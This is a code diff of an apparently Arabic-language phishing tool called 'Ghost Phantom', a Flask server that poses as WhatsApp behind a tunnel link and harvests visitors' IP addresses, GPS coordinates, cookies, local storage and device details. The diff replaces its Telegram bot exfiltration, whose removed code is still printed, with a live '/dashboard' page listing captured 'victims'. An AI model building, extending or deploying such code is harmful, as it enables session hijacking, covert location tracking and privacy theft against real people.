@@ -1,4 +1,3 @@
-#!/usr/bin/env python3
 import os
 import sys
 import time
@@ -7,7 +6,6 @@ import base64
 import json
 import threading
 import subprocess
-import requests
 from datetime import datetime
 
 try:
@@ -26,8 +24,6 @@ init(autoreset=True)
 app = Flask(__name__)
 
 CONFIG = {
-    "token": "",
-    "chat_id": "",
     "target_name": "WhatsApp",
     "theme": "whatsapp"
 }
@@ -36,6 +32,8 @@ SESSION_STATE = {
     "scanned": False,
     "token": f"ALQAEAR_GHOST_SESS_{int(time.time())}"
 }
+
+HARVESTED_VICTIMS = []
 
 BANNER = f"""
 {Fore.RED}
@@ -220,6 +218,47 @@ HTML_TEMPLATE = """
 </html>
 """
 
+DASHBOARD_TEMPLATE = """
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>Al-Qaesar Live Dashboard</title>
+    <style>
+        body { background: #0b0f19; color: #f3f4f6; font-family: Tahoma, sans-serif; padding: 20px; margin: 0; }
+        h1 { color: #38bdf8; text-align: center; }
+        .container { max-width: 900px; margin: auto; }
+        .card { background: #1e293b; padding: 20px; border-radius: 8px; margin-bottom: 15px; border: 1px solid #334155; }
+        .label { color: #38bdf8; font-weight: bold; }
+        .data { color: #cbd5e1; word-break: break-all; }
+        .refresh-btn { background: #0284c7; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; display: block; margin: 20px auto; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🛡️ لوحة تحكم القيصر الحية (Live Operations)</h1>
+        <button class="refresh-btn" onclick="location.reload()">تحديث البيانات</button>
+        <div id="results">
+            {% if victims %}
+                {% for v in victims %}
+                <div class="card">
+                    <p><span class="label">الوقت:</span> <span class="data">{{ v.timestamp }}</span></p>
+                    <p><span class="label">المنصة:</span> <span class="data">{{ v.platform }}</span></p>
+                    <p><span class="label">عنوان IP:</span> <span class="data">{{ v.ip }}</span></p>
+                    <p><span class="label">الموقع الجغرافي:</span> <span class="data">Lat: {{ v.latitude }} | Lon: {{ v.longitude }}</span></p>
+                    <p><span class="label">المتصفح والنظام:</span> <span class="data">{{ v.os_platform }} | {{ v.user_agent }}</span></p>
+                    <p><span class="label">ملفات الارتباط (Cookies):</span> <span class="data">{{ v.cookies }}</span></p>
+                </div>
+                {% endfor %}
+            {% else %}
+                <p style="text-align: center; color: #94a3b8;">لا توجد أي أهداف مُلتقطة حتى الان. بانتظار الضحايا...</p>
+            {% endif %}
+        </div>
+    </div>
+</body>
+</html>
+"""
+
 def save_to_json(data):
     filename = "ghost_harvested_data.json"
     try:
@@ -233,26 +272,6 @@ def save_to_json(data):
             json.dump(records, f, indent=4, ensure_ascii=False)
     except Exception as e:
         print(f"[-] JSON Error: {e}")
-
-def send_telegram_msg(msg):
-    if not CONFIG["token"] or not CONFIG["chat_id"]:
-        return
-    url = f"https://api.telegram.org/bot{CONFIG['token']}/sendMessage"
-    try:
-        requests.post(url, data={"chat_id": CONFIG["chat_id"], "text": msg, "parse_mode": "Markdown"}, timeout=5)
-    except:
-        pass
-
-def send_telegram_photo(photo_b64, caption):
-    if not CONFIG["token"] or not CONFIG["chat_id"]:
-        return
-    url = f"https://api.telegram.org/bot{CONFIG['token']}/sendPhoto"
-    try:
-        header, encoded = photo_b64.split(",", 1)
-        image_bytes = base64.b64decode(encoded)
-        requests.post(url, data={"chat_id": CONFIG["chat_id"], "caption": caption, "parse_mode": "Markdown"}, files={"photo": ("ghost_capture.jpg", image_bytes)}, timeout=10)
-    except:
-        pass
 
 @app.route('/')
 def index():
@@ -275,6 +294,10 @@ def index():
                                  sub=t["sub"], 
                                  instructions=t["instructions"])
 
+@app.route('/dashboard')
+def dashboard():
+    return render_template_string(DASHBOARD_TEMPLATE, victims=reversed(HARVESTED_VICTIMS))
+
 @app.route('/check-status')
 def check_status():
     return jsonify({"status": "captured" if SESSION_STATE["scanned"] else "waiting"})
@@ -286,58 +309,29 @@ def capture_ghost():
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     SESSION_STATE["scanned"] = True
     
-    cookies = data.get('cookies', 'None')
-    storage = data.get('storage', 'None')
-    screen = data.get('screen', 'Unknown')
-    plat = data.get('platform', 'Unknown')
-    lang = data.get('lang', 'Unknown')
-    cores = data.get('cores', 'Unknown')
-    memory = data.get('memory', 'Unknown')
-    userAgent = data.get('userAgent', 'Unknown')
-    connection = data.get('connection', 'Unknown')
-    lat = data.get('lat', 'N/A')
-    lon = data.get('lon', 'N/A')
-    cam_image = data.get('image', None)
-    
     record = {
         "timestamp": timestamp,
         "platform": CONFIG["target_name"],
         "token": SESSION_STATE["token"],
         "ip": victim_ip,
-        "user_agent": userAgent,
-        "connection": connection,
-        "screen": screen,
-        "os_platform": plat,
-        "language": lang,
-        "cpu_cores": cores,
-        "device_memory": memory,
-        "latitude": lat,
-        "longitude": lon,
-        "cookies": cookies,
-        "local_storage": storage
+        "user_agent": data.get('userAgent', 'Unknown'),
+        "connection": data.get('connection', 'Unknown'),
+        "screen": data.get('screen', 'Unknown'),
+        "os_platform": data.get('platform', 'Unknown'),
+        "language": data.get('lang', 'Unknown'),
+        "cpu_cores": data.get('cores', 'Unknown'),
+        "device_memory": data.get('memory', 'Unknown'),
+        "latitude": data.get('lat', 'N/A'),
+        "longitude": data.get('lon', 'N/A'),
+        "cookies": data.get('cookies', 'None'),
+        "local_storage": data.get('storage', 'None')
     }
     
+    HARVESTED_VICTIMS.append(record)
     save_to_json(record)
     
-    telegram_msg = (
-        f"🔥 *[القيصر اليماني] تقرير عمليات Ghost Phantom v10.0* 🔥\n\n"
-        f"🎯 *المنصة:* `{CONFIG['target_name']}`\n"
-        f"🔑 *التوكن:* `{SESSION_STATE['token']}`\n"
-        f"🌐 *IP الضحية:* `{victim_ip}`\n"
-        f"📶 *نوع الاتصال:* `{connection}`\n"
-        f"📱 *النظام والشاشة:* `{plat} | {screen}`\n"
-        f"⚙️ *العتاد:* `أنوية المعالج: {cores} | الرام: {memory}GB | اللغة: {lang}`\n"
-        f"📍 *الموقع (خطوط الطول والعرض):* `{lat}, {lon}`\n"
-        f"🍪 *Cookies:* `{cookies[:220]}...`\n"
-        f"⏱️ *الوقت:* `{timestamp}`"
-    )
-    
     print(f"\n{Fore.GREEN}[+] Ghost Target Fully Compromised! IP: {victim_ip} | Deep Recon Captured!{Style.RESET_ALL}")
-    
-    if cam_image and cam_image.startswith("data:image"):
-        send_telegram_photo(cam_image, telegram_msg)
-    else:
-        send_telegram_msg(telegram_msg)
+    print(f"{Fore.CYAN}[*] يمكنك مراجعة البيانات حياً عبر المتصفح بالدخول إلى الرابط ومعها /dashboard{Style.RESET_ALL}")
         
     return jsonify({"status": "success"})
 
@@ -372,6 +366,7 @@ def start_tunnel():
                             if word.startswith("https://"):
                                 print(f"\n{Fore.GREEN}[+] ═══════════════════════════════════════════════════════ [+]")
                                 print(f"{Fore.GREEN}[+]  الرابط الشبح العالمي النشط (Ghost Payload URL): {Fore.WHITE}{word}")
+                                print(f"{Fore.GREEN}[+]  لوحة التحكم المحلية للمتصفح (Live Dashboard): {Fore.WHITE}{word}/dashboard")
                                 print(f"{Fore.GREEN}[+] ═══════════════════════════════════════════════════════ [+]\n{Style.RESET_ALL}")
                                 return
         except Exception:
@@ -401,10 +396,6 @@ if __name__ == '__main__':
     else:
         CONFIG["target_name"] = "WhatsApp"
         CONFIG["theme"] = "whatsapp"
-
-    CONFIG["token"] = input(f"{Fore.YELLOW}[?] أدخل توكن بوت تليجرام للإشعارات الفورية (اضغط Enter للتخطي): {Style.RESET_ALL}").strip()
-    if CONFIG["token"]:
-        CONFIG["chat_id"] = input(f"{Fore.YELLOW}[?] أدخل معرف الـ Chat ID الخاص بك: {Style.RESET_ALL}").strip()
 
     print(f"\n{Fore.CYAN}[*] جارٍ تشغيل نظام القيصر الشبح (Ghost Engine) على المنفذ 5000...{Style.RESET_ALL}")
     threading.Thread(target=run_server, daemon=True).start()
